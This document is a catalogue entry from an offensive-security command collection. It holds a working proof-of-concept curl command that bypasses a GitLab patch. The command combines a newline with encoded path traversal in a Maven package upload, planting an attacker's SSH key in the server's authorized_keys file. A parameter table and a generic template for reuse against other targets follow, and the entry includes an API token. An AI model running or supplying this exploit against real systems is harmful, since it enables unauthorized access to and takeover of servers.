---
data: >-
  curl -H "Private-Token: xQsDqzWrsUKsNCwdtXGT"
  http://10.26.0.3/api/v4/projects/1/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/a%0a%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys
  -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub; echo
tags:
  - curl
  - bypass
type: command
executor: bash
platforms:
  - Linux
id: b086f193-e09c-4eab-bffe-4b62cc4c3928
created_at: '2025-12-11T03:47:39.638Z'
updated_at: '2025-12-11T03:47:39.638Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-patch

## Command

```bash
curl -H "Private-Token: xQsDqzWrsUKsNCwdtXGT" http://10.26.0.3/api/v4/projects/1/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/a%0a%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub; echo
```

## Description

POC for bypassing initial fix using newline in filename, demonstrating continued vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-XPUT` | Specifies PUT method | Yes |
| `; echo` | Appends echo for output separation | No |
| `--path-as-is` | Prevents curl from normalizing the path | Yes |
| `-H "Private-Token: xQsDqzWrsUKsNCwdtXGT"` | Authenticates with GitLab API token | Yes |
| `--data-binary @/home/asakawa/.ssh/id_rsa.pub` | Uploads the binary content of the public key file | Yes |

## Examples

### Basic Usage

```bash
curl -H "Private-Token: token" http://target/... -XPUT --path-as-is --data-binary @key.pub; echo
```

## Expected Output

JSON response with file details and confirmation of write.

## Related

- [[procedures/Bypass-Initial-Patch-with-Newline-Payload]]
- [[commands/curl-path-traversal-exploit]]
